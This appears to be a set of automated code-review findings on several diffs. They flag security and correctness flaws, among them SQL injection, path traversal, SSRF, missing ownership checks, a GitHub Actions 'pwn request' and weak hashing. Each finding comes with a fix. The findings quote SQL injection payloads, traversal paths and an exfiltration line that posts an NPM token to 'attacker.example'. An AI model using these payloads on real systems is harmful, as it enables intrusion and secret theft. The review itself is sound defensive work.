`ACMEPAY_SECRET_KEY` is a live-mode credential (the `acme_live_` prefix is AcmePay's production key marker) checked into the repository, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`.

Adversary: anyone who can read the source — every person with repo access, anyone with a clone or fork, CI log/artifact readers, and anyone who later obtains a source snapshot. They control nothing; they simply read the file. What they get: the ability to authenticate to AcmePay as this merchant and create charges, issue refunds, and read customer/payment data.

The key must be treated as compromised the moment this lands (git history retains it even if reverted later): rotate it at AcmePay, then restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch) and remove the constant. Consider purging the value from history if it was ever pushed.

findings.title: Per-environment key configuration removed; all envs now use one key
findings.body: `client()` previously resolved the API key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, which is what let dev, CI, staging and production each bind to their own AcmePay account. After this change the key is a module-level constant, so the environment variable is ignored everywhere and every deployment authenticates as the same account — and the literal is prefixed `acme_live_`, i.e. the production one. Any test or staging run that reaches `client()` will issue real charges. Restore the environment lookup (optionally with a default for local use), or at minimum read the constant only as a fallback when the env var is absent.

findings.title: fake_client() returns a dict where client() returns the module
findings.body: `client()` returns the `acmepay` module object, so callers use attribute access (`client().Charge.create(...)`). `fake_client()` returns a plain dict `{"api_key": TEST_KEY}`, which supports only subscript access. Any test that substitutes this fixture for `client()` will fail with `TypeError`/`AttributeError` rather than exercising the real call shape. Consider returning a stub object (e.g. `SimpleNamespace` or a small fake class) whose attributes mirror the module.

findings.title: tenant_of returns an unverified, caller-forgeable tenant id
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` is whatever the bearer of the token typed into the payload — no key is consulted and no expiry/audience check runs (disabling signature verification also disables the registered-claim checks in PyJWT). Any caller that uses this value to scope a query or select a tenant's data is doing cross-tenant selection on unauthenticated input. The sibling function `claims_for` on line 7 decodes the same token *with* the public key, so the module now hands out two different trust levels for the same token and nothing at the call site distinguishes them. Derive the tenant from the verified claims instead, e.g. `return claims_for(token)["tenant_id"]`; if avoiding the key-store round trip is the goal, cache the key rather than skipping verification.

_Also raised by the security agent:_ tenant_id read from a JWT decoded with signature verification disabled

findings.title: No test exercises tenant_of()
findings.body: tenant_of() is new, security-sensitive code (it extracts tenant_id from a token without verifying the signature) and no test file is included in this diff. Nothing would catch a regression such as a wrong key lookup, a change in claim name, or a tampered-token acceptance. Add a test that passes a token with a known tenant_id claim and asserts tenant_of() returns it, plus a case exercising a malformed/missing-claim token.

findings.title: Missing tenant_id claim raises KeyError rather than an auth error
findings.body: Because verification is skipped, no claim is guaranteed to be present: a token with a valid structure but no `tenant_id` makes line 12 raise `KeyError` instead of an authentication/authorization failure. Depending on how callers wrap this, that surfaces as a 500 rather than a 401/403. Use `.get("tenant_id")` with an explicit check, or raise the module's own auth exception when the claim is absent.

findings.title: tenant_of gives no indication it skips signature verification
findings.body: tenant_of sits right next to claims_for, which verifies the signature. tenant_of does not, but neither its name nor a comment says so. A caller skimming the module could reasonably assume both functions offer the same trust guarantees and use tenant_of's result as if it were verified. A short comment or a name like tenant_of_unverified would make the contract explicit.

findings.title: Missing require_owner check lets any user edit others' payment methods
findings.body:
`update_payment_method` resolves `pm_id` straight from the request into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()` — with no ownership check. The call to `current_user(request)` on line 11 establishes authentication only, and its result `user` is never used, which strongly suggests the `require_owner(user, pm)` call was simply dropped. The sibling read handler on lines 5–7 does call `require_owner`, and `api/auth.py` documents that "Every object mutation must call this."

Adversary: any authenticated user of the service. What they control: the `pm_id` path/query parameter and the request body. What they get: the ability to enumerate or guess other users' payment-method ids and rewrite the billing name on cards they do not own — tampering with another account's billing records, and (since `to_dict()` is returned) reading back the stored payment-method representation of an arbitrary user, i.e. cross-tenant disclosure as well.

Fix: add `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any field assignment.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unguarded body["billing_name"] raises KeyError on partial update

findings.title: No test coverage for new update_payment_method function
findings.body: update_payment_method is new, untested code that mutates persisted state and returns data to the caller. No test file is included in this diff. Given the sibling read endpoint on lines 5-7 calls require_owner and this new function does not, a test exercising an unauthorized user's request (or even just a basic happy-path test) would have caught the missing check. As it stands, nothing would fail if this function were wrong — e.g. if it let a non-owner update someone else's payment method, or if pm.save() silently failed.

findings.title: Rate limit removed from unauthenticated password reset endpoint
findings.body:
`request_reset` is a password-reset entry point that takes an attacker-supplied `email` and calls `send_reset_email(email)` with no remaining throttle. With the decorator gone, an unauthenticated remote caller can loop on this endpoint to (a) mail-bomb an arbitrary victim address with reset mails, (b) burn provider quota/spend, and (c) issue an unbounded number of reset tokens per account, which widens the window for any token-guessing or interception attack.

The PR rationale — "the email provider already throttles" — does not substitute for a per-identifier limit: provider throttling is typically global/per-sender, so exhausting it converts the abuse into a denial of password reset for every other user, and it does nothing to cap requests against a single victim address. Restore a limiter keyed on both source IP and the target email (e.g. the previous `5/hour`), or move the equivalent control into `send_reset_email`/middleware before merging.

findings.title: request_reset now has no per-caller bound on reset emails
findings.body: `request_reset` now calls `send_reset_email(email)` on every invocation with no throttle in front of it. The PR rationale is that the email provider already throttles, but provider-side throttling is typically global (sender volume / deliverability), not per-recipient or per-requester, so a single attacker can still drive an unbounded number of reset mails at one address and mint an unbounded number of reset tokens. If the provider's global throttle is the only backstop, it also means abuse of this endpoint degrades all transactional mail, not just resets. Either keep a per-email/per-IP bound here, or state explicitly which provider control enforces a per-recipient limit and at what value.

findings.title: No test guards the rate-limit removal on password reset
findings.body: The diff removes the `@rate_limit("5/hour")` decorator from `request_reset`. There is no test in this change verifying request throttling behavior before or after, so nothing would fail if this removal were wrong (e.g., if the email provider's throttling assumption is incorrect or absent in some environments). If any prior test asserted rate-limiting behavior on this endpoint, it is not shown here as being updated or removed, meaning either such a test doesn't exist (coverage gap) or it silently still refers to removed behavior.

findings.title: Preview path skips _confined(), allowing arbitrary file reads
findings.body:
The existing reader resolves the caller-supplied `name` through `_confined(name)` (line 14) before opening it; `read_export_preview` instead passes `name` straight into `os.path.join(EXPORT_ROOT, name)` (line 20). `os.path.join` does not constrain the result to `EXPORT_ROOT`: a `name` containing `../` segments walks out of the export directory, and an absolute `name` (e.g. `/etc/passwd`) discards `EXPORT_ROOT` entirely. The first `limit` bytes of any file readable by the process are then returned to the caller.

The PR description says the preview path "reuses the same layout as download" — it should also reuse the same confinement. Replace line 20 with `path = _confined(name)` so both entry points share one validation point.

_Also raised by the security agent:_ Preview path skips _confined(), allowing path traversal

findings.title: No test exercises read_export_preview's path handling
findings.body: read_export_preview joins EXPORT_ROOT with the raw name argument directly (os.path.join(EXPORT_ROOT, name)) instead of calling _confined(name) as the download path does on line 14. This is a behavior change from the existing pattern, and no test in this diff verifies that path traversal inputs (e.g. name='../../etc/passwd') are rejected. If this were wrong, nothing would fail today.

findings.title: Ownership check removed from bulk_export enables cross-tenant IDOR
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report; that loop and the `require_owner` import are both removed. Now any authenticated caller can pass arbitrary `report_ids` and receive `r.to_dict()` for reports belonging to other tenants.

Adversary: any user with a valid session (including a legitimate customer on another tenant). Controls: the `report_ids` list in the request. Gets: full serialized contents of arbitrary reports across tenants, enumerable by ID.

If the loop was removed for performance, keep the authorization but push it into the fetch — e.g. a single scoped query `Report.where(id__in=report_ids, tenant_id=user.tenant_id)` and reject (or 404) when the returned count differs from the requested count. Do not rely on authentication alone; per the docstring in `api/auth.py`, every read of another tenant's data must go through `require_owner`.

_Also raised by the correctness agent:_ bulk_export no longer enforces per-report tenant ownership

findings.title: No test guards against removal of ownership check in bulk_export
findings.body: The diff removes the per-report require_owner(user, report) call from bulk_export, meaning a user could now export reports belonging to another tenant. No test file is included in this change, and nothing in the shown repository context indicates an existing test asserts that bulk_export enforces tenant ownership. If this removal is wrong (as it appears to be), no test would fail — the function would just return other tenants' data silently.

findings.title: SQL injection: search_customers interpolates term/status into SQL
findings.body:
`search_customers` builds the query with an f-string, splicing `term` and `status` into string literals, then calls `execute(sql)` with no params. Any caller value containing a single quote breaks out of the literal: a `term` of `' OR '1'='1` returns every customer row, and `'; DROP TABLE customers; --` or a UNION payload reaches the database verbatim. The PR describes this as a support-facing name/status search, so the values are request-supplied.

Fix by keeping both values as bound parameters, as `get_customer` on line 5 already does, e.g.

```python
sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the parameter value, not in the SQL text. If `status` is meant to be one of a fixed set, validate it against an allowlist too.

findings.title: search_customers bypasses execute()'s params contract; breaks on quotes
findings.body:
`billing.db.execute` documents that it "Run[s] a parameterised query. `params` must carry every caller value." `search_customers` instead splices `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, so the helper's contract is not met.

Beyond the obvious injection exposure, this is a plain correctness defect for reachable, legitimate input: a customer name such as `O'Brien` closes the string literal early and the statement becomes syntactically invalid, raising a driver error instead of returning results. A `None` term or status silently becomes the literal text `None` in the query rather than a NULL/empty match. Any `%` or `_` the user types is also treated as a LIKE wildcard rather than a literal character.

Follow the pattern already used one function above (line 5) and pass values as parameters:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

findings.title: New search_customers function has no test coverage
findings.body: search_customers is new behavior (name/status lookup) but no test exercises it. Nothing would catch a regression in the query logic, and nothing would catch the SQL injection risk from interpolating `term`/`status` directly into the SQL string (contrast with get_customer, which uses execute's parameterized form). A test that calls search_customers with a malicious or quote-containing term/status and asserts the emitted SQL/params would have caught this immediately.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check enforced above
findings.body:
The existing send path validates the destination host against `ALLOWED_HOSTS` (lines 8-9) before calling `requests.post`. `verify_endpoint` takes a caller-supplied `url` and issues `requests.get` with no equivalent check, so any tenant-registered URL — including internal addresses such as `http://169.254.169.254/...` or `http://localhost:*` — is fetched by the server. Since the feature description says tenants register these URLs themselves, this input is untrusted by construction.

Extract the host-allowlist logic from the send path into a shared helper and call it from `verify_endpoint` before the request. Also consider `allow_redirects=False`, since a permitted host can otherwise redirect the request to a disallowed one.

_Also raised by the security agent:_ verify_endpoint skips the ALLOWED_HOSTS check — SSRF

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: A function named `verify_endpoint` returning a status code reads as "tell me whether this target works". But DNS failures, connection refusals and the 5s timeout all surface as `requests.RequestException` subclasses propagating out of line 14, so the common negative case — the endpoint is simply unreachable — is an exception rather than a result. Callers wiring this into a registration form will have to catch `requests.RequestException` to avoid a 500. Either catch it here and return a sentinel (e.g. `None`), or document that the function raises.

findings.title: verify_endpoint has no test coverage
findings.body: verify_endpoint is a new public function that performs an outbound GET request and returns a status code, but no test in this diff exercises it. Notably it does not appear to reuse the ALLOWED_HOSTS check used by the POST path (lines 8-9), so a test would also catch whether that omission is intentional. Without a test, any regression here (wrong return value, missing timeout, wrong exception handling) would pass silently.

findings.title: Customer-invoice bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` on a bucket named `acme-customer-invoices`. This is the account-level safety net that prevents a public ACL or a `Principal: "*"` bucket policy from ever taking effect; with it off, any later `public-read` ACL on an uploaded object, any misconfigured policy, or any writer with `s3:PutObjectAcl` makes customer invoices readable by anyone on the internet at a guessable URL (the bucket name is fixed and unsuffixed, so the endpoint is trivially enumerable).

The adversary is any unauthenticated internet user; what they control is nothing at all — they only need one object or policy to be public once; what they get is customer billing data.

Unless invoices are genuinely meant to be world-readable (they are not, by the name), this resource should keep all four flags at `true`, which is the AWS default and matches the intent of having a *separate* public assets bucket. Note also that the PR description mentions only the marketing assets bucket — this second bucket appears to be out of the stated scope and may have been added unintentionally.

findings.title: New bucket is customer invoices, not assets, with all public blocks off
findings.body:
The PR describes adding a public assets bucket for the marketing site, but the assets bucket and its access block already existed (lines 5-11 are only reformatted). The actual new resources are `aws_s3_bucket.invoices` (`acme-customer-invoices`) plus an `aws_s3_bucket_public_access_block` that sets all four guardrails to `false`. Setting `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` to `false` removes every account-level protection against a public ACL or bucket policy being attached to a bucket of customer financial documents — either now or accidentally later by any principal that can call PutBucketAcl/PutBucketPolicy.

If the intent really is only a public marketing bucket, the `invoices` resources do not belong in this change. If the invoices bucket is genuinely needed, it should be created without the public access block override (or with all four values `true`), so the default deny-public posture stays in place.

findings.title: verify_acmepay compares MAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC-SHA256 digest as `verify_stripe` but validates it with `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature are correct, allowing an attacker who can submit repeated webhook deliveries to recover a valid signature byte-by-byte without knowing the secret. The function immediately above already does this correctly. Change line 12 to `return hmac.compare_digest(expected, header)`. Note that `compare_digest` raises `TypeError` on a `None` header, whereas `==` returns `False`, so if callers can pass a missing header, guard with `if header is None: return False` first.

_Also raised by the security agent:_ HMAC signature compared with `==` instead of compare_digest

findings.title: verify_acmepay has no accompanying test
findings.body: The new verify_acmepay function is added with no test exercising it (no test file appears in this diff). If the comparison logic were wrong — e.g. inverted, always returning True, or broken by a future refactor — nothing would fail. Add a test asserting correct/incorrect signatures are accepted/rejected.

findings.title: 500 handler returns exception text and full traceback to the client
findings.body:
`handle()` now serialises `str(exc)` and `traceback.format_exc()` into the HTTP 500 response body. Any client that can provoke an unhandled exception — typically by sending malformed or boundary-case input to any route wired to this handler — receives the stack frames: absolute source paths, module and function names, dependency versions inferable from vendored frame paths, and the exception message itself. Exception messages routinely carry the sensitive part of the operation that failed: failed SQL statements with fragments of data, DSNs/connection strings including credentials from driver errors, internal hostnames from connection timeouts, and key or token values from validation libraries. That is a reconnaissance and occasionally a credential-disclosure primitive for an unauthenticated attacker.

The diagnostic goal is already met by the line above: `log.exception("request failed")` writes the same traceback server-side. Keep the response opaque and give on-call a join key instead:

```python
def handle(exc):
    incident_id = uuid.uuid4().hex
    log.exception("request failed", extra={"incident_id": incident_id})
    return {"error": "internal error", "incident_id": incident_id}, 500
```

If detail in the body is genuinely wanted, gate it on an explicit non-production setting rather than defaulting it on.

Secondary note on the same line: `traceback.format_exc()` reads the *current* exception context, not `exc`. If `handle()` is ever called outside an `except` block (e.g. from a framework hook that has already unwound), it yields `"NoneType: None"` rather than the intended trace — so the field is unreliable for the stated purpose even setting the disclosure aside.

_Also raised by the correctness agent:_ 500 response body shape and value changed for existing callers

_Also raised by the correctness agent:_ traceback.format_exc() may not correspond to `exc`

findings.title: No test verifies the error response contents
findings.body: The change to handle() now returns exception details and a full traceback in the API response body, a significant behavior change from the previous generic message. No test in this diff exercises handle() to check the shape or content of the returned tuple. Without a test, a future change (e.g. reverting to a safe generic message, or accidentally including more sensitive data) would not be caught.

findings.title: Reset password hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives its stored value with a single unsalted `hashlib.md5`, while `hash_password` two lines above uses `bcrypt.hashpw` with a generated salt. MD5 is a fast, unsalted, GPU-friendly digest: whatever this value protects (the reset-flow password, or the token/secret it stands in for) can be recovered from a leaked table by rainbow-table lookup or offline brute force at billions of guesses per second, and identical inputs produce identical digests so equal values are visible across accounts.

The adversary is anyone who reads the stored column — a SQL-injection reader, a backup or log leak, or an insider with DB access. They need control of no input at all; obtaining the row is enough to get the plaintext back, which then works against the primary bcrypt-protected login because it is the same user secret.

Use the same primitive as the existing helper: `bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()`. If this path really needs a reset *token* rather than a password, generate it with `secrets.token_urlsafe`, store a SHA-256 of the high-entropy token, and compare with `hmac.compare_digest` — but do not keep MD5 for user-chosen input.

(I could not see the caller: no entry point for `raw` appears in this diff and no repository context was retrieved, so whether this feeds the reset form or a token is unconfirmed — hence major rather than critical.)

findings.title: Reset hash format is incompatible with the bcrypt verify path
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), while the new `hash_reset_password` returns a bare 32-char hex MD5 digest. If both values land in the same password column, the existing verification routine (almost certainly `bcrypt.checkpw`) cannot validate the MD5 form — `checkpw` either raises `ValueError` on an invalid salt or returns `False`, so a user who went through the reset flow can never log back in. Either make the reset path produce a bcrypt hash via `hash_password`, or store reset hashes in a distinct field with a distinct verifier. (Separately, MD5 without a salt is not an acceptable password digest at all.)

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is a new function used on a security-sensitive path (password reset), but no test exists in this diff to verify its behavior. If it were changed (e.g., swapped for a different weak/strong algorithm, or broke entirely), nothing would fail. Add a test asserting the expected hash format/algorithm behavior for this function.

findings.title: checksum() loads the entire file into memory
findings.body: `fh.read()` materialises the whole file before hashing. For an upload or backup artifact of arbitrary size this is an unbounded allocation driven by input. Prefer chunked reads: create the hasher, then loop `for chunk in iter(lambda: fh.read(1 << 20), b"")` and `update`.

findings.title: pull_request_target runs untrusted fork code with NPM_TOKEN and write token
findings.body:
This change combines the three ingredients of a "pwn request":

1. Line 4 switches the trigger to `pull_request_target`, which runs the workflow in the context of the **base** repository. Unlike `pull_request`, it is granted the repository's secrets and a `GITHUB_TOKEN` with write scopes, and it runs automatically for pull requests from forks with no maintainer approval gate.
2. Lines 11–12 override the checkout ref to `github.event.pull_request.head.sha` — the attacker's commit. The working tree is now fully attacker-controlled, including `scripts/measure.sh`.
3. Line 13 executes that attacker-controlled script, and lines 14–15 inject `secrets.NPM_TOKEN` into its environment.

Adversary: any GitHub user, since anyone can fork a public repo and open a PR. What they control: the entire contents of `scripts/measure.sh` (and anything it sources, plus `package.json` lifecycle scripts, lockfiles, config files it reads). What they get: arbitrary command execution on the runner with `NPM_TOKEN` in `env` — trivially exfiltrated with `curl -d "$NPM_TOKEN" attacker.example` — plus the privileged `GITHUB_TOKEN` available at `/home/runner/work/_temp/` and in the git credential helper, which typically allows pushing to the base repo. The attacker never has to merge anything; opening the PR is enough.

Fixes, in order of preference:

- Revert to `on: pull_request`. Fork PRs already run under that trigger; they just get a read-only token and no secrets. If the only motivation was "external contributors get the same CI signal", `pull_request` already provides it — `pull_request_target` is not needed for that.
- If a secret genuinely must be available, split into two workflows: an untrusted `pull_request` job that builds and uploads an artifact, and a `workflow_run` job that consumes the artifact without checking out fork code.
- At minimum, never check out `head.sha` under `pull_request_target`, never pass secrets to a step running fork-supplied code, and set `permissions:` to the least privilege needed.

_Also raised by the correctness agent:_ pull_request_target + untrusted head checkout runs fork code with secrets

findings.title: Stated goal does not require the trigger change; `pull_request` already runs on forks
findings.body:
The PR description says the switch is needed "so external contributors get the same CI signal," but `pull_request` already fires for pull requests opened from forks — the job would have been running and reporting status all along. The only behavioural delta introduced by `pull_request_target` is that the job now receives repository secrets and a write-scoped `GITHUB_TOKEN`.

So either the real (unstated) problem was that `measure.sh` fails without `NPM_TOKEN` — in which case the fix is an artifact-passing two-workflow split, not a trigger swap — or the change is unnecessary and should be reverted. Worth confirming which before merging, since the chosen mechanism does not address the stated symptom.

findings.title: json.dumps narrows accepted context values; previously-valid calls now raise
findings.body:
The old key `(template_source, tuple(sorted(context.items())))` worked for any context whose values were hashable and whose keys were mutually comparable — dates, decimals, tuples, frozensets, enums, arbitrary objects with `__hash__`. `json.dumps` accepts a strictly smaller set: anything not JSON-native raises `TypeError: Object of type X is not JSON serializable`, and the exception escapes `cached_render` to the caller. Mixed key types are also newly fatal: `json.dumps({1: 'a', 'b': 2}, sort_keys=True)` raises `TypeError: '<' not supported between instances of 'str' and 'int'`, whereas `sorted(context.items())` in the old code would have raised only for the same mixed-key case but `tuple(...)` handled every uniform-key case fine.

If any existing caller passes a context containing, say, a `datetime` or a model object, this change turns a working render into an exception. Either serialise with `default=repr` (accepting the aliasing that implies) or fall back to the old tuple key when `json.dumps` fails.

findings.title: No test for cache-key collisions introduced by JSON serialization
findings.body: The key is now derived from `json.dumps([template_source, context], sort_keys=True)`. JSON serialization coerces types in ways the previous tuple-of-sorted-items key did not: e.g. dict keys are always stringified (`{1: 'x'}` and `{'1': 'x'}` serialize identically), and value types like tuples become lists, or int/float distinctions can be lost depending on values. This means two semantically distinct `(template_source, context)` pairs can now collide on the same cache key and silently return a stale/wrong render. None of the added tests (`test_key_is_by_value_not_by_identity`, `test_different_context_renders_again`) exercise contexts with non-string keys, nested structures, or mixed types, so this collision risk introduced by the digest change would go undetected.

findings.title: Test only checks shell=False, not the constructed argv list
findings.body:
test_runs_without_a_shell asserts spy.last_call.kwargs['shell'] is False but never inspects the positional args (the list passed to subprocess.run). The actual fix in this PR is switching from a shell-interpolated string to a list of argv tokens with a '--' separator before the directory — that's the part that actually prevents injection. If a future change reintroduced string formatting of the command (e.g. accidentally passed a single joined string as the first positional arg, or dropped the '--' separator, or embedded `directory` unsanitized into the tar target), shell would still be False and this test would keep passing, giving false confidence that the safe-invocation contract is intact.

_Also raised by the correctness agent:_ Test uses an undefined `spy` fixture and would otherwise run real tar

findings.title: `directory` is no longer word-split or glob-expanded by the shell
findings.body: Previously the command string was interpreted by `/bin/sh`, so a `directory` value such as `"/srv/data /srv/logs"` or `"/srv/data/*"` was split into several arguments and globs were expanded before `tar` saw them. With the list form the whole value is passed as one literal path, so any caller relying on multiple paths or a glob now gets `tar: ...: Cannot stat: No such file or directory`, and `check=True` turns that into a `CalledProcessError` at runtime rather than a clear error. Please confirm every caller passes exactly one concrete path, or accept a sequence of directories and splat it into the argv list.

findings.title: New ValueError rejects names that previously succeeded (dots, colons, >64 chars)
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` and at most 64 characters, so common archive names that the old implementation accepted — e.g. `nightly.2024-01-01`, `export:v2`, or a long tenant-qualified name — now raise `ValueError` instead of producing a file. This is a new exception type on an otherwise unchanged signature; callers that only guard against `CalledProcessError` will crash. Either widen the allowlist to include `.` (while still rejecting `..` and `/`) or confirm no caller constructs names outside the allowlist.

findings.title: `directory` reaches tar unvalidated; caller not visible in diff
findings.body:
`name` is now allowlisted, but `directory` is passed straight through to `tar` as the source path. The `--` on line 12 correctly stops it from being interpreted as an option flag, so there is no argument-injection here, and `shell=False` rules out shell metacharacters. What remains is that any caller able to influence `directory` chooses which directory gets read and packaged into `/exports/<name>.tar.gz` — e.g. `/etc`, `/root`, or a secrets mount — and if `/exports` is served or downloadable, that is arbitrary file disclosure.

If `directory` is ever derived from a request parameter, resolve it (`os.path.realpath`) and assert it stays under an expected export root before calling. If it is always an internal, non-user-derived constant, this is not a problem and can be ignored.

findings.title: test_renders_empty_invoice asserts nothing
findings.body:
`test_renders_empty_invoice` calls `render(Invoice(lines=[]))` and then ends. The only failure mode it can detect is an uncaught exception; any wrong output for the blank-invoice case (missing header, stray separator, `None` returned instead of a string) passes silently. Since the empty-collection boundary is exactly what this test exists to pin down, assert on the result — e.g. that the return value is a string and that it contains the header/total but no line-item rows.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion

findings.title: Test asserts mock call_count, not rendered output
findings.body:
test_renders_line_items patches format_line and only checks that it was called twice; it never checks what render() actually produced (e.g. that the formatted line items appear in the output). If format_line's output were dropped or mis-concatenated, this test would still pass. Assert on the actual rendered string instead of the mock call count.

_Also raised by the correctness agent:_ Line-item test checks only the mock call count, not rendered output

findings.title: Failing boundary test deleted rather than updated to the new behaviour
findings.body:
`test_rounds_half_to_even` was the only test covering the exact-half boundary (`Decimal("2.345")`), which is precisely the case the described rounding fix changes. Deleting it removes all coverage of that boundary instead of re-asserting the corrected expectation. If the intended new behaviour is, say, `Decimal("2.35")` (or banker's rounding to `2.34` under a different quantisation), the test should be updated to assert that value, not removed. As it stands a future regression back to the old rounding would go undetected.

Also note the PR title says "Fix the rounding", but no change to the rounding implementation appears in this diff — only the test deletion. Either the fix is missing from this change set or the commit needs to include it; merging the deletion alone silently drops an assertion about behaviour that nothing else verifies.

_Also raised by the tests agent:_ Rounding fix has no test coverage after deletion

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so `deliver` is bound in `notify.sender`'s namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` continues to call the original function. This test therefore invokes the real transport up to three times (possible network I/O, flakiness, or a false pass whenever the real `deliver` happens to return a falsy value), and it does not actually cover the give-up-after-N-failures path it is named for.

Use the same target as the existing test on line 2: `mocker.patch("notify.sender.deliver", return_value=False)`. Consider also asserting the call count equals `attempts` so the retry loop is genuinely verified.

_Also raised by the tests agent:_ Mock patches wrong target; retry path is not actually exercised

findings.title: csv_rows joins fields without calling csv_escape
findings.body: `csv_rows` builds each line by joining `str(r.get(c, ""))` directly with commas, bypassing the `csv_escape` helper added in the same change. Any cell value containing a comma or a double quote produces a line with the wrong number of fields (or unbalanced quotes), silently corrupting the export — no exception is raised, so the caller cannot detect it. The fix is to route each field through the helper, e.g. `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: csv_rows joins raw values, bypassing the csv_escape helper
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never calls `csv_escape`, which is defined ten lines below for exactly this purpose. Any field value that contains a comma, a double quote, or a newline is emitted unescaped, so a single logical field splits into several CSV fields (or several records) in the consumer's parser. Whoever supplies the row data — an end user filling in a report field, an upstream API — controls the number and content of columns in the exported file, which lets them forge values in adjacent columns of the row a downstream importer reads.

Fix: render each cell as `csv_escape(str(r.get(c, "")))`, and extend `csv_escape` to also quote values containing `\n`/`\r`. Using the stdlib `csv` module would handle all of this. If these exports are opened in a spreadsheet, also consider prefixing values that start with `=`, `+`, `-` or `@` to avoid formula injection.

findings.title: New exporter functions added with no accompanying tests
findings.body: The repository already has a test convention for exporters (test_csv_header_matches_columns covers csv_header). This PR adds csv_rows and csv_escape (reports/csv_export.py), dump_streaming and dump_pretty (reports/json_export.py), and margins_for and usable_width (reports/pdf_export.py), none of which have tests. A bug in CSV escaping (e.g. mishandling embedded quotes), a chunking off-by-one in dump_streaming, or an incorrect margin calculation would all pass silently since nothing exercises these new functions.

findings.title: csv_escape raises TypeError on non-string values
findings.body: `csv_escape` applies `in` and `.replace` directly to `value`, so passing an int, float, `None`, or any non-string raises `TypeError: argument of type 'int' is not iterable`. Since the sibling `csv_rows` explicitly coerces with `str(...)` — acknowledging that row values are not necessarily strings — the escape helper should coerce too (`value = str(value)` on entry) or document that callers must pre-stringify.

findings.title: Test is flaky across the UTC midnight boundary
findings.body:
`issue_token()` captures the clock at one instant and `datetime.now(timezone.utc)` on line 11 reads it again. If the two calls straddle 00:00 UTC, the two `.date()` values differ and the assertion fails for reasons unrelated to the code under test. The same latent dependence applies to line 12, whose result changes with the real clock.

Make the test deterministic: have `issue_token()` accept an injected `now` (as `is_expired` already does, per line 6), or freeze/patch the clock, then assert against that fixed instant rather than re-reading `datetime.now`.

_Also raised by the tests agent:_ Time-dependent test uses real clock, will be flaky near midnight UTC

findings.title: `is_expired` called without the `now` argument the sibling test passes
findings.body: The existing test on line 6 always calls `is_expired(..., now=...)`. The new call omits `now`, so it relies on `now` having a default that falls back to the current clock. If `now` is a required keyword-only parameter this test raises `TypeError`; if it defaults to the real clock, the assertion is time-dependent in the same way as line 11. Either way, passing an explicit `now` derived from a fixed instant is the safer and more consistent call.

findings.title: No test exercises the CouponExpired rejection branch
findings.body:
apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but tests/test_coupons.py only updated the happy-path test to pass a non-expired coupon (expires_at=tomorrow()). There is no test that passes an expired coupon and asserts CouponExpired is raised. If the expiry comparison were inverted, off-by-one, or removed entirely, the existing test suite would still pass.

_Also raised by the correctness agent:_ New CouponExpired branch has no test

findings.title: apply_coupon now requires a tz-aware expires_at on every coupon
findings.body: `apply_coupon` previously only read `coupon.amount`; it now unconditionally dereferences and compares `coupon.expires_at`. Any existing caller or stored coupon that lacks the attribute raises `AttributeError`, one with `expires_at = None` raises `TypeError: '<' not supported between 'NoneType' and 'datetime'`, and one with a naive datetime raises `TypeError: can't compare offset-naive and offset-aware datetimes` — all surfacing as a 500 rather than a clean rejection. The test diff already shows that the only existing construction site had to be amended, which is the signal that other construction sites exist. Either treat a missing/None `expires_at` as "never expires" (`if coupon.expires_at is not None and coupon.expires_at < now`) or normalise naive values to UTC before comparing.
